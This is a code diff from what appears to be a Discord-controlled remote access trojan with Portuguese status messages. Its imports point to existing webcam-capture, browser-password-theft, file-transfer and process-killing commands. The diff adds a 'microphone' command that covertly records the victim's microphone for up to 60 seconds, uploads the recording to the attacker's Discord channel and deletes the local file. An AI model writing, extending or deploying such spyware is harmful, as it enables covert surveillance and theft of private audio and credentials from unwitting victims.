@@ -16,6 +16,7 @@ from commands.camera import take_webcam_photo
 from commands.browser_passwords import get_browser_passwords
 from commands.file_operations import list_directory, upload_file, download_file_from_attachment
 from commands.process_handler import kill_process, list_processes
+from commands.audio_recorder import record_audio
 
 def register_commands(client):
     @client.command()
@@ -320,3 +321,48 @@ def register_commands(client):
                 
         except Exception as e:
             await ctx.send(f"```[!] erro ao finalizar processo: {str(e)}```")
+
+    @client.command(aliases=["mic", "audio"])
+    @is_authorized()
+    @is_in_session_channel()
+    async def microphone(ctx, duration: int = 10):
+        try:
+            if duration < 1:
+                await ctx.send("```[!] duração mínima: 1 segundo```")
+                return
+                
+            if duration > 60:
+                duration = 60
+                await ctx.send("```[!] duração ajustada para o máximo: 60 segundos```")
+            
+            data = datetime.now()
+            hora_formatada = data.strftime("%d/%m/%Y")
+            data_formatada = data.strftime("%H:%M:%S")
+            processing_msg = await ctx.send(f"```[+] gravando áudio do microfone ({duration}s) {data_formatada} : {hora_formatada}```")
+            
+            filepath, error = await asyncio.to_thread(record_audio, duration)
+            
+            if error:
+                await processing_msg.edit(content=f"```[!] erro ao gravar áudio: {error}```")
+                return
+            
+            if not filepath or not os.path.exists(filepath):
+                await processing_msg.edit(content=f"```[!] erro: arquivo de áudio não foi gerado```")
+                return
+            
+            await processing_msg.edit(content=f"```[+] enviando gravação de áudio ({duration}s)...```")
+            
+            try:
+                await ctx.send(file=discord.File(filepath))
+                await processing_msg.edit(content=f"```[+] audio enviado com sucesso! duração: {duration}s```")
+            except Exception as e:
+                await processing_msg.edit(content=f"```[!] erro ao enviar arquivo: {str(e)}```")
+            
+            try:
+                if os.path.exists(filepath):
+                    os.remove(filepath)
+            except Exception as e:
+                print(f"[!] erro ao remover arquivo temporário: {str(e)}")
+                    
+        except Exception as e:
+            await ctx.send(f"```[!] erro ao processar comando: {str(e)}```")
